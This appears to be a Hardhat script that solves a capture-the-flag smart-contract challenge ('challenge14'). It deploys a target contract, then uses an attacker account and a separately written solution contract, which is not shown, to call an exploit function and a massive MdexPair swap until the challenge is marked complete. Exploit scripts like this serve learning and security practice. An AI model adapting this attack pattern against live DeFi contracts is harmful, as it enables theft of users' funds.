const { ethers } = require("hardhat");
const { address } = require("hardhat/internal/core/config/config-validation");
const { expect } = require("chai");

async function deploy(deployer) {
  const Storage3Main = await ethers.getContractFactory(
    "Storage3Main",
    deployer
  );
  const storage3Main = await Storage3Main.deploy();
  console.log("Storage3Main contract:", storage3Main.address);
  return storage3Main;
}

async function exploit(storage3Main, attacker) {
  const Storage3MainSolution = await ethers.getContractFactory(
    "Storage3MainSolution",
    attacker
  );

  const solution = await Storage3MainSolution.deploy(storage3Main.address);
  const MdexPair = await ethers.getContractFactory(
    "contracts/challenge14/Pair.sol:MdexPair"
  );

  const mdexPair = await MdexPair.attach(await storage3Main.pair());
  console.log("Solution contract:", solution.address);
  await solution
    .connect(attacker)
    .expliot(
      "0xa69def6c822d7936413d16ab65637dd19d0adf85872c33a2391493ba9dead00b"
    );
  mdexPair
    .connect(attacker)
    .swap(
      "999999999999999999999999999999999999999999999999",
      0,
      solution.address,
      "0x1234"
    );
  await storage3Main.connect(attacker).isComplete();
}

async function main() {
  let [deployer, attacker] = await ethers.getSigners();
  let storage3Main = await deploy(deployer);
  console.log(attacker.address);
  await exploit(storage3Main, attacker);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
